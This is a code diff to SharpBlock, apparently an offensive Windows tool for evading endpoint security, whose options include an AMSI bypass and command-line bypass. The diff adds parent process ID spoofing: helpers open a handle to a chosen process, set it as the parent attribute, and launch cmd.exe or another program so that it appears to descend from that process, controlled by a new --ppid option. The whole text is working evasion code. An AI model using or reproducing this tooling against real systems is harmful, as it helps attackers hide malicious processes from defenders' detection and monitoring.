@@ -559,7 +559,44 @@ namespace SharpBlock {
 
             return result;
         }
-        
+
+        private static IntPtr InitializeProcThreadAttributeList(int attributeCount) {
+
+            const int reserved = 0;
+            var size = IntPtr.Zero;
+            bool wasInitialized = WinAPI.InitializeProcThreadAttributeList(IntPtr.Zero, attributeCount, reserved, ref size);
+            if (wasInitialized || size == IntPtr.Zero) {
+                throw new Exception(string.Format("Couldn't get the size of the attribute list for {0} attributes", attributeCount));
+            }
+
+            IntPtr lpAttributeList = Marshal.AllocHGlobal(size);
+            if (lpAttributeList == IntPtr.Zero) {
+                throw new Exception("Couldn't reserve space for a new attribute list");
+            }
+
+            wasInitialized = WinAPI.InitializeProcThreadAttributeList(lpAttributeList, attributeCount, reserved, ref size);
+            if (!wasInitialized) {
+                throw new Exception("Couldn't create new attribute list");
+            }
+
+            return lpAttributeList;
+        }
+
+        private static void SetNewProcessParent(ref STARTUPINFOEX startupInfoEx, int parentProcessId) {
+
+            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
+            IntPtr handle = WinAPI.OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
+            IntPtr lpValue = Marshal.AllocHGlobal(IntPtr.Size);
+            Marshal.WriteIntPtr(lpValue, handle);
+
+            bool success = UpdateProcThreadAttribute(startupInfoEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValue,
+                                                         (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+
+            if (!success) {
+                throw new Exception(string.Format($"Error setting [{parentProcessId}] as the parent PID for the new process"));
+            }
+        }
+
         static void Main(string[] args) {
 
             string program = "c:\\windows\\system32\\cmd.exe";
@@ -573,6 +610,7 @@ namespace SharpBlock {
             bool patchedArgs = false;
             bool kernelBaseLoaded = false;
             bool showWindow = false;
+            int ppid = -1;
             HostProcessInfo hpi = new HostProcessInfo();
 
             Console.WriteLine(
@@ -588,6 +626,7 @@ namespace SharpBlock {
                 .Add("p=|product=", "Product string to block", v => blockProduct.Add(v))
                 .Add("d=|description=", "Description string to block", v => blockDescription.Add(v))
                 .Add("s=|spawn=", "Host process to spawn for swapping with the target exe", v => hostProcess = v)
+                .Add("ppid=", "PID of the process to use for parent process spoofing", v => ppid = int.Parse(v) )
                 .Add("w|show", "Show the lauched process window instead of the default hide", v => showWindow = true )
                 .Add("disable-bypass-amsi", "Disable AMSI bypassAmsi", v => bypassAmsi = false)
                 .Add("disable-bypass-cmdline", "Disable command line bypass", v => bypassCommandLine = false)
@@ -630,16 +669,22 @@ namespace SharpBlock {
                 WinAPI.DuplicateHandle(currentProcess, WinAPI.GetStdHandle(StdHandle.STD_ERROR_HANDLE), currentProcess, out stdErr, 0, true, 2);
                 WinAPI.DuplicateHandle(currentProcess, WinAPI.GetStdHandle(StdHandle.STD_INPUT_HANDLE), currentProcess, out stdIn, 0, true, 2);
 
-                STARTUPINFO startupInfo = new STARTUPINFO();
-                startupInfo.cb = (uint)Marshal.SizeOf(startupInfo);
+                STARTUPINFOEX startupInfo = new STARTUPINFOEX();
+                startupInfo.StartupInfo.cb = (uint)Marshal.SizeOf(startupInfo);
                 uint launchFlags = WinAPI.DEBUG_PROCESS;
 
                 if (!showWindow) {
-                    startupInfo.dwFlags = 0x00000101;
-                    startupInfo.hStdOutput = stdOut;
-                    startupInfo.hStdError = stdErr;
-                    startupInfo.hStdInput = stdIn;
+                    startupInfo.StartupInfo.dwFlags = 0x00000101;
+                    startupInfo.StartupInfo.hStdOutput = stdOut;
+                    startupInfo.StartupInfo.hStdError = stdErr;
+                    startupInfo.StartupInfo.hStdInput = stdIn;
                     launchFlags |= 0x08000000;
+                }
+
+                if (ppid > 0) {
+                    launchFlags |= 0x80000;
+                    startupInfo.lpAttributeList = InitializeProcThreadAttributeList(1);
+                    SetNewProcessParent(ref startupInfo, ppid);    
                 }
 
                 PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
